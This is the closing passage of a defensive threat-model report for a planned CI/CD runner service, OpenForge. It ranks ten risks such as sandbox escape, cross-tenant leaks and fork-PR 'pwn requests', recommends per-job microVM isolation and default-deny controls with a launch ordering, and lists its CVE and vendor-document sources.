| 5 | Runner registration hijacking / runner-token theft | med | high | med | fix month 1 |
| 6 | OIDC token replay / cross-cloud theft | med | high | med | fix month 1 |
| 7 | Network egress exfiltration (DNS/HTTPS, metadata) | high | high | high | **block launch** if cloud creds in scope; else fix month 1 |
| 8 | DoS via long-running / fork-bomb jobs | high | med | low | fix month 1 |
| 9 | Cross-tenant data leak (reused runner, no isolation) | med | high | high | **block launch** |
| 10 | Privilege escalation via fork PR ("pwn request") | high | high | med | **block launch** |

**Reading the matrix.** The four **block-launch** items (1, 3, 9, 10) are the ones where a
failure is *both* high-impact and a direct violation of the core promise — "your untrusted code
and your secrets are isolated from everything else." If any of these is broken, no customer
with production secrets will trust the runner, so they are launch gates, not backlog. The
**fix month 1** items are real, high-value, and mostly about *policy + tooling* (lockfiles,
claim binding, rotation, egress allowlists) rather than a fundamental re-architecture — they
can be shipped with a clear, documented interim control and then hardened in the first month.
Problem 8 is the cheapest win (kernel limits) and should simply never be skipped. Problem 7 is
the one whose cost is genuinely high *and* whose severity depends on scope: if OpenForge jobs
can mint cloud credentials (OIDC, problem 6), then open egress is a block-launch item; if jobs
are pure build/test with no cloud creds, it can start as a fix-month-1 with a deny-by-default
proxy.

---

## What This Means for OpenForge (Synthesis)

This is a ~100-line operational reading of the ten problems above, aimed at the
architecture decision and the launch plan.

**The one architectural decision that dominates everything: the isolation primitive.**
Almost every problem reduces to a single question — *what is the boundary between an untrusted
job and (a) other jobs, (b) the runner host, and (c) the control plane/secrets?* If OpenForge
answers that with "a Docker container on a long-lived host," it has simultaneously weakened
problems 1, 3, 8, and 9 and made 7 nearly unfixable. If it answers with "a fresh, kernel-
enforced, per-tenant, per-job microVM (Firecracker/gVisor) with deny-by-default network and no
persistent cross-tenant state," it removes the *root cause* of five of the ten problems at
once. That is the highest-leverage choice in the codebase and should be made **before** any
runner feature work. The rest of the list is mostly policy, protocol, and tooling layered on
top of that boundary. Treat the isolation primitive as the product's security identity, not an
infrastructure detail.

**The three dealbreakers (block launch).** I would gate the launch on exactly three, and they
are not the three most "dramatic" — they are the three that are *most exploited in the wild*
and that a security-savvy customer will probe first:

1. **Problem 10 — the fork-PR "pwn request."** This is the attack a customer's security team
   will demonstrate against you in the first week of a trial. If a forked PR can touch your
   secrets or a write token, you are dead on arrival. The fix is a *default* (deny secrets and
   write for untrusted PRs; unprivileged build → privileged `workflow_run` separation;
   `persist-credentials: false`; a static workflow scanner that blocks the dangerous combo).
   It is medium-cost and non-negotiable. Ship it as the default, not an opt-in.
2. **Problem 1 — sandbox escape.** If untrusted code can reach the host, every other control is
   decoration. This *requires* the kernel-grade isolation primitive from the paragraph above.
   You cannot bolt this on later; it is the substrate.
3. **Problem 9 — cross-tenant isolation.** For a *competitor* to GitHub, multi-tenancy is the
   product. One tenant reading another's code or secrets is not a bug report, it is the reason
   enterprise customers never move. Ephemeral, per-tenant, per-job isolation with no shared
   writable state is the only defensible default.

I would treat **Problem 3 (secret leakage)** as effectively a *fourth* dealbreaker in practice:
if secrets are in env, on disk, or in the process list, a customer will find it (and it is the
most common real-world leak). It is cheaper to get right (out-of-band credential delivery, no
CLI args, ephemeral disk, all-sink masking) than 1 or 9, so it belongs in the "block launch,
but fast" bucket — fix it in the same release as the isolation primitive.

**What can ship as a known, documented limitation.** These are the ones where a reasonable,
honest interim control is enough at launch, with a committed hardening path:

- **Problem 8 (DoS/fork-bomb).** Ship with **kernel cgroup limits** from day one (it is cheap
  and should never be absent), but per-tenant *abuse accounting* and adaptive caps can be a
  month-1/early-roadmap item. Document the wall-clock and concurrency caps clearly.
- **Problem 5 (runner-token theft).** Ship with **short-lived, single-use, JIT registration**
  as the default; the full "unrecognized-machine alerting + continuous rotation + runner-group
  RBAC" surface can mature in month 1–3. The core (no long-lived reusable token) must be at
  launch, but the observability around it can trail.
- **Problem 6 (OIDC replay).** Ship with **binding-first trust-policy templates** (the platform
  *forces* the cloud role to check `ref`/`sha`/`repository`/`actor`, not just `iss`/`sub`) and
  short per-job TTLs; the deeper ABAC/custom-claims and cross-cloud audience tooling can be a
  roadmap item. The default template doing the right thing is the launch bar.
- **Problem 2 (cache poisoning).** Ship with a **server-generated, tenant + privilege-scoped,
  signed cache key** and per-tenant buckets; the full "cache-as-a-communication-channel"
  threat-model review and cross-privilege cache audit can follow in month 1. The signed,
  namespaced key at launch is the bar.
- **Problem 4 (supply chain).** This is *partially* a known limitation at launch and *partially*
  a gate. Ship **SHA-pinning + workflow lockfiles + identity verification** as the default (this
  is the gate — it is what stops the 2025-style tag-bump), but the full *ecosystem* (a signed,
  collision-resistant publisher registry, static action-code scanning at scale, verified-creator
  attestation) is a year-1 build. Be explicit with users that third-party actions are executed
  untrusted code and that the lockfile is their protection.
- **Problem 7 (egress).** Ship a **deny-by-default egress proxy + metadata-IP block** as the
  baseline. If, at launch, jobs *cannot* mint cloud credentials, this is a fix-month-1 with a
  documented allowlist; the moment OIDC/cloud-cred minting (problem 6) is GA, egress becomes a
  hard launch gate. Sequence these two deliberately.

**The ordering I would actually use.** (1) Build the isolation primitive (microVM per job,
per-tenant, deny-by-default net) — this is problems 1, 8, and most of 9. (2) Wire secrets as
out-of-band, no-CLI-arg, ephemeral-disk credentials — problem 3. (3) Make fork-PR
unprivileged-by-default and ship the workflow scanner — problem 10. At the end of those three
steps you have the *trustworthy* core and can do a closed alpha with real secrets. (4) In month
1, add the lockfile/SHA-pinning gate (4), JIT runner tokens (5), binding OIDC templates (6),
signed cache keys (2), and the egress proxy baseline (7). (5) In year 1, build the supply-chain
ecosystem, egress policy depth, and abuse observability.

**The honest caveat.** Problems 6 and 7 are the two where I could not cite a single clean
*product* CVE, because they are fundamentally **trust-policy misconfigurations and design
properties** (under-specified OIDC trust; open egress) rather than one exploitable code bug.
I cited the real vendor security documents that define the correct model instead, and that is
the accurate picture — it is not a gap in my research, it is the nature of these two classes.
Everything else in this document is backed by a verified CVE with a verbatim NVD description.
The operational consequence for OpenForge is the same either way: both must be solved by
*default-deny platform behavior*, because you cannot assume every customer will write their
trust policy or network config correctly — the platform has to make the safe choice the only
easy one.

**Final line for the architecture review.** If you had to remember only three things: make the
*isolation primitive* a kernel-enforced, per-tenant, per-job microVM; make *untrusted PRs and
third-party actions* unprivileged-by-default and pinned-by-SHA; and make *secrets* out-of-band,
never in env/CLI/disk. Those three decisions retire the majority of the risk in this document
and are the difference between a runner people trust with production secrets and a runner that
is one malicious PR away from a breach.

---

## Appendix — Verified Source List

All sources below were retrieved and verified live on 2026-11-03. CVE descriptions are quoted
verbatim from the NVD 2.0 REST API; vendor documents were fetched and confirmed.

| Problem | Primary citation | Type | CVSS | URL |
|---|---|---|:---:|---|
| 1 | CVE-2022-2185 (GitLab import RCE) | CVE | 8.8 HIGH | https://nvd.nist.gov/vuln/detail/CVE-2022-2185 |
| 1 | CVE-2019-10394 (Jenkins Script Security sandbox bypass) | CVE | 4.2 MED | https://nvd.nist.gov/vuln/detail/CVE-2019-10394 |
| 2 | CVE-2022-1423 (GitLab CI/CD cache poisoning) | CVE | 7.1 HIGH | https://nvd.nist.gov/vuln/detail/CVE-2022-1423 |
| 3 | CVE-2024-23897 (Jenkins unauth file read, CISA KEV) | CVE | 9.8 CRIT | https://nvd.nist.gov/vuln/detail/CVE-2024-23897 |
| 3 | GitHub "Security hardening for GitHub Actions" | vendor docs | n/a | https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions |
| 4 | CVE-2025-30066 (tj-actions tag bump, CISA KEV) | CVE | 8.6 HIGH | https://nvd.nist.gov/vuln/detail/CVE-2025-30066 |
| 4 | CVE-2021-23337 (lodash command injection) | CVE | 7.2 HIGH | https://nvd.nist.gov/vuln/detail/CVE-2021-23337 |
| 5 | CVE-2018-20500 (GitLab runner registration token) | CVE | n/a (CWE-732) | https://nvd.nist.gov/vuln/detail/CVE-2018-20500 |
| 5 | CVE-2026-24059 (registration-token endpoint authz) | CVE | 6.5 MED | https://nvd.nist.gov/vuln/detail/CVE-2026-24059 |
| 6 | GitHub OIDC security docs (token/claim model) | vendor docs | n/a | https://docs.github.com/en/actions/concepts/security/openid-connect |
| 7 | GitHub "Security hardening for GitHub Actions" (egress/metadata) | vendor docs | n/a | https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions |
| 7 | CVE-2025-30066 (egress-exfil leg) | CVE | 8.6 HIGH | https://nvd.nist.gov/vuln/detail/CVE-2025-30066 |
| 8 | CVE-2017-6198 (supervisor fork-bomb DoS, CWE-400) | CVE | n/a | https://nvd.nist.gov/vuln/detail/CVE-2017-6198 |
| 9 | GitHub "Security hardening for GitHub Actions" (shared runners) | vendor docs | n/a | https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions |
| 10 | GitHub Security Lab "Preventing pwn requests" (2021) | research | n/a | https://securitylab.github.com/research/github-actions-preventing-pwn-requests/ |

Secondary / corroborating URLs verified during research:

- GitLab CVE-2022-2185 advisory JSON: https://gitlab.com/gitlab-org/cves/-/blob/master/2022/CVE-2022-2185.json
- GitLab CVE-2022-2185 HackerOne report: https://hackerone.com/reports/1609965
- Jenkins CVE-2024-23897 advisory: https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
- Jenkins CVE-2024-23897 CISA KEV entry: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-23897
- CISA CVE-2025-30066 supply-chain alert (2025-03-18): https://www.cisa.gov/news-events/alerts/2025-03-18/supply-chain-compromise-third-party-github-action-cve-2025-30066
- tj-actions/changed-files issue thread (first reports): https://github.com/tj-actions/changed-files/issues/2463
- GitHub Security Lab pwn-requests (canonical redirect): https://securitylab.github.com/resources/github-actions-preventing-pwn-requests

*Note on scoring: CVSS values shown are the NVD-published base scores as of 2026-11-03.
Vendor self-assigned scores (e.g., GitLab rating CVE-2022-2185 as Critical) may differ from the
NVD number; where a discrepancy exists it is stated in the body. Two CVEs (CVE-2018-20500,
CVE-2017-6198) have no NVD CVSS vector and are instead identified by CWE and affected versions.*
